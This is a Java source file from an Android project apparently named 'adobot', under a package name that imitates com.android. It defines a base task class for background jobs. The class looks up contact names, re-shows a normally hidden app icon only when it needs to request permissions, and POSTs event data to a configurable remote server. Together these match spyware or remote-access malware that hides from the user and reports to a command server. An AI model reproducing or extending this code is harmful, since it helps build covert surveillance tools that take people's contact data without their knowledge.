package com.android.adobot.tasks;

import android.Manifest;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.v4.content.ContextCompat;

import com.android.adobot.BuildConfig;
import com.android.adobot.CommonParams;
import com.android.adobot.Constants;
import com.android.adobot.activities.AskPermissionsActivity;
import com.android.adobot.http.Http;
import com.android.adobot.http.HttpRequest;

import java.util.HashMap;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

/**
 * Created by adones on 2/22/17.
 */

public class BaseTask extends Thread implements Runnable {

    protected Context context;
    protected CommonParams commonParams;

    protected void setContext(Context context) {
        this.context = context;
        this.commonParams = new CommonParams(context);
    }

    protected void showAppIcon() {
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, AskPermissionsActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public String getContactName(String phoneNumber) {
        // check permission
        if (ContextCompat.checkSelfPermission(context.getApplicationContext(), Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            ContentResolver cr = context.getContentResolver();
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
            Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (cursor == null) {
                return null;
            }
            String contactName = null;
            if (cursor.moveToFirst()) {
                contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
            }

            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
            }

            return contactName;
        } else {
            return "";
        }
    }

    protected void requestPermissions() {
        // app icon already shown in debug
        if (!BuildConfig.DEBUG) showAppIcon();
        Intent i = new Intent(context, AskPermissionsActivity.class);
        i.addFlags(FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(i);
    }

    protected void sendNotification (String event, HashMap params) {
        params.put("event", event);
        Http req = new Http();
        req.setMethod(HttpRequest.METHOD_POST);
        req.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
        req.setParams(params);
        req.execute();
    }

}
